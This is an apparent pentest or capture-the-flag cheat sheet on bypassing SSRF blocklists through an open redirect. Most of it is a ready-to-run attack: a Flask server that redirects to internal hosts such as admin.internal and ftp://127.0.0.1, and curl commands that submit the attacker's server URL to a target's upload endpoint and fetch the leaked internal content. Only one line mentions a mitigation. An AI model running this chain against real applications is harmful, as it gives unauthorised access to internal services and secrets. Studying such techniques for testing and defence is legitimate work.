# SSRF Bypass via Open Redirect

When an application filters SSRF targets by blocklist (e.g., blocking `admin.internal` or `127.0.0.1`), a redirect chain can bypass it. The application fetches a URL on the attacker's server, which redirects to the internal target. HTTP libraries that follow redirects (e.g., Python `requests`) will follow the redirect and return the internal content.

## Technique

```bash
# 1. Host a redirect server on your machine
# Flask example:
cat > redirect.py << 'EOF'
from flask import Flask, redirect
app = Flask(__name__)

@app.route("/")
def r1():
    return redirect("http://admin.internal/")

@app.route("/2")
def r2():
    return redirect("http://admin.internal/secret")

@app.route("/ftp")
def r3():
    return redirect("ftp://127.0.0.1/")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
EOF

python3 redirect.py

# 2. Submit your server URL to the SSRF endpoint
# Application fetches: http://<LHOST>/ → redirects → http://admin.internal/
curl -X POST http://<TARGET>/upload -d "url=http://<LHOST>/"

# 3. Read the returned content/link
curl "http://<TARGET>/uploads/<returned_hash>"
```

## Notes
- Works when the app follows HTTP redirects without re-checking the final URL against its blocklist
- Python `requests` follows redirects by default; disable with `allow_redirects=False`
- Use different routes to probe different internal endpoints
- Also works with `ftp://`, `file://` protocols if the redirect target supports them
- Check what protocols the underlying HTTP library supports (requests: http/https/ftp)
